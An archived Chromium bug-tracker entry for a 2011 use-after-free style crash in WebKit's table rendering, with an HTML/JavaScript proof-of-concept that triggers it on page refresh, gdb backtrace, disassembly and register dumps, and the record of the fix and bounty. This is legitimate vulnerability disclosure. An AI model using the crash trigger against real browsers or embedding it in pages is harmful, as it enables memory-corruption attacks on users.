# Stale pointer due to table childs incorrect added

| Field | Value |
|-------|-------|
| **Issue ID** | [40087321](https://issues.chromium.org/issues/40087321) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-01-27 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Under certain circumstances, chromium will crash due to an attempt to fetch an instruction from null called from WebCore::RenderObjectChildList::destroyLeftoverChildren. The crash usually occurs after the page is refreshed, so the proof of concept causes the page to refresh using a meta tag. In my testing, it did not take more than one refresh to trigger the crash.

**VERSION**  

Chrome Version: Chromium 8.0.552.237 Ubuntu 10.04 stable  

Operating System: Ubuntu 10.04 (64 bit)

**REPRODUCTION CASE**

<html>
<head>
<title>WebCore::RenderObjectChildList::destroyLeftoverChildren crash PoC</title>
<meta http-equiv="refresh" content="1" />
</head>
<body onload="boom();">
<div style="display: table;">
<em id="em"></em>
<audio controls="arbitrary" style="display: table-caption;" />
<img id="img" />
</div>
<script type="text/javascript">
function boom() {
var img = document.getElementById('img');
var em = document.getElementById('em');
em.parentNode.replaceChild(img, em);
}
</script>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

A shortened version of the trace through the program using gdb is included below. The full version as well as the reproduction case are attached.

$ chromium-browser --debug --single-process poc.html

# Env:

# LD\_LIBRARY\_PATH=/usr/lib/chromium-browser

# PATH=/usr/lib/chromium-browser:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# GTK\_PATH=

# CHROMIUM\_USER\_FLAGS=

# CHROMIUM\_FLAGS=

/usr/bin/gdb /usr/lib/chromium-browser/chromium-browser -x /tmp/chromiumargs.8WT0zi  

GNU gdb (GDB) 7.1-ubuntu  

Copyright (C) 2010 Free Software Foundation, Inc.  

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  

This is free software: you are free to change and redistribute it.  

There is NO WARRANTY, to the extent permitted by law. Type "show copying"  

and "show warranty" for details.  

This GDB was configured as "x86\_64-linux-gnu".  

For bug reporting instructions, please see:  

<http://www.gnu.org/software/gdb/bugs/>...  

Reading symbols from /usr/lib/chromium-browser/chromium-browser...Reading symbols from /usr/lib/debug/usr/lib/chromium-browser/chromium-browser...done.  

done.  

(gdb) run

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffe3ca2700 (LWP 4990)]  

0x0000000000000000 in ?? ()  

(gdb) bt  

#0 0x0000000000000000 in ?? ()  

#1 0x00007ffff6953f1e in WebCore::RenderObjectChildList::destroyLeftoverChildren (this=0x7ffff8f7faa8)  

at third\_party/WebKit/WebCore/rendering/RenderObjectChildList.cpp:47  

#2 0x00007ffff68d9945 in WebCore::RenderBlock::destroy (this=0x7ffff8f7fa10)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:156  

#3 0x00007ffff69657b3 in WebCore::RenderTableCell::destroy (  

this=0x7ffff8f80d80)  

at third\_party/WebKit/WebCore/rendering/RenderTableCell.cpp:59  

#4 0x00007ffff6953f97 in WebCore::RenderObjectChildList::destroyLeftoverChildren (this=0x7ffff8f7fa00)  

at third\_party/WebKit/WebCore/rendering/RenderObjectChildList.cpp:57  

#5 0x00007ffff694d2ec in WebCore::RenderObject::destroy (this=0x7ffff8f7f988)  

at third\_party/WebKit/WebCore/rendering/RenderObject.cpp:2154  

#6 0x00007ffff696698a in WebCore::RenderTableRow::destroy (  

this=0x7ffff8f80d80)  

at third\_party/WebKit/WebCore/rendering/RenderTableRow.cpp:49  

#7 0x00007ffff6953f97 in WebCore::RenderObjectChildList::destroyLeftoverChildren (this=0x7ffff8f7f928)  

at third\_party/WebKit/WebCore/rendering/RenderObjectChildList.cpp:57  

#8 0x00007ffff694d2ec in WebCore::RenderObject::destroy (this=0x7ffff8f7f8b0)  

at third\_party/WebKit/WebCore/rendering/RenderObject.cpp:2154

(gdb) frame 1  

#1 0x00007ffff6953f1e in WebCore::RenderObjectChildList::destroyLeftoverChildren (this=0x7ffff8f7faa8)  

at third\_party/WebKit/WebCore/rendering/RenderObjectChildList.cpp:47  

47 third\_party/WebKit/WebCore/rendering/RenderObjectChildList.cpp: No such file or directory.  

in third\_party/WebKit/WebCore/rendering/RenderObjectChildList.cpp  

(gdb) disassemble  

Dump of assembler code for function \_ZN7WebCore21RenderObjectChildList23destroyLeftoverChildrenEv:  

0x00007ffff6953f00 <+0>: push %rbx  

0x00007ffff6953f01 <+1>: mov %rdi,%rbx  

0x00007ffff6953f04 <+4>: mov (%rdi),%rdi  

0x00007ffff6953f07 <+7>: nopw 0x0(%rax,%rax,1)  

0x00007ffff6953f10 <+16>: test %rdi,%rdi  

0x00007ffff6953f13 <+19>: je 0x7ffff6953f45 <\_ZN7WebCore21RenderObjectChildList23destroyLeftoverChildrenEv+69>  

0x00007ffff6953f15 <+21>: mov (%rdi),%rax  

0x00007ffff6953f18 <+24>: callq \*0x108(%rax)  

=> 0x00007ffff6953f1e <+30>: test %al,%al  

0x00007ffff6953f20 <+32>: je 0x7ffff6953f50 <\_ZN7WebCore21RenderObjectChildList23destroyLeftoverChildrenEv+80>  

0x00007ffff6953f22 <+34>: mov (%rbx),%rdi  

0x00007ffff6953f25 <+37>: mov 0x18(%rdi),%rdx  

0x00007ffff6953f29 <+41>: test %rdx,%rdx  

0x00007ffff6953f2c <+44>: je 0x7ffff6953f10 <\_ZN7WebCore21RenderObjectChildList23destroyLeftoverChildrenEv+16>  

0x00007ffff6953f2e <+46>: mov (%rdx),%rax  

0x00007ffff6953f31 <+49>: mov %rdi,%rsi  

0x00007ffff6953f34 <+52>: mov %rdx,%rdi  

0x00007ffff6953f37 <+55>: callq \*0x88(%rax)  

---Type <return> to continue, or q <return> to quit---q  

Quit  

(gdb) i r  

rax 0x7ffff8f80ee0 140737370394336  

rbx 0x7ffff8f7faa8 140737370389160  

rcx 0x17 23  

rdx 0x7ffff8f80d80 140737370393984  

rsi 0x3c 60  

rdi 0x7ffff8f80d80 140737370393984  

rbp 0x7ffff901e100 0x7ffff901e100  

rsp 0x7fffe3ca1180 0x7fffe3ca1180  

r8 0x0 0  

r9 0x3f 63  

r10 0x7ffff913d500 140737372214528  

r11 0x7fffeef9e8cc 140737202743500  

r12 0x7fffe3ca1601 140737015059969  

r13 0x7ffff8fe51c8 140737370804680  

r14 0x7ffff8fe5230 140737370804784  

r15 0x2 2  

rip 0x7ffff6953f1e 0x7ffff6953f1e [WebCore::RenderObjectChildList::destroyLeftoverChildren()+30](javascript:void(0);)  

eflags 0x10202 [ IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

---Type <return> to continue, or q <return> to quit---  

fs 0x0 0  

gs 0x0 0  

(gdb) print \*this  

$1 = {m\_firstChild = 0x7ffff8f80d80, m\_lastChild = 0x7ffff8f80d80}  

(gdb)

## Attachments

- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 12.5 KB)
- [poc.html](attachments/poc.html) (text/html; charset=us-ascii, 507 B)

## Timeline

### in...@chromium.org (2011-01-27)

Thanks Marty.

    if (!wrapInAnonymousSection) {
        // If the next renderer is actually wrapped in an anonymous table section, we need to go up and find that.
        while (beforeChild && !beforeChild->isTableSection() && !beforeChild->isTableCol() && beforeChild->style()->display() != TABLE_CAPTION)
            beforeChild = beforeChild->parent();

        RenderBox::addChild(child, beforeChild);
        return;
    }

### in...@chromium.org (2011-01-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-01-28)

filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=53276

### in...@chromium.org (2011-01-31)

Fixed in http://trac.webkit.org/changeset/77141

### in...@chromium.org (2011-01-31)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-02-03)

@MartyBarbella: congrats! This is another provisional reward at the $1000 level.
In this instance, we're rewarding at the higher $1000 level, thanks to the nicely minimal repro, and good stack + register analysis.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### in...@chromium.org (2011-02-09)

m9 merged in http://trac.webkit.org/changeset/78099

still needs m10 merge.

### in...@chromium.org (2011-02-09)

merged to m10 in r78125.

### sc...@gmail.com (2011-03-04)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/71114?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087321)*
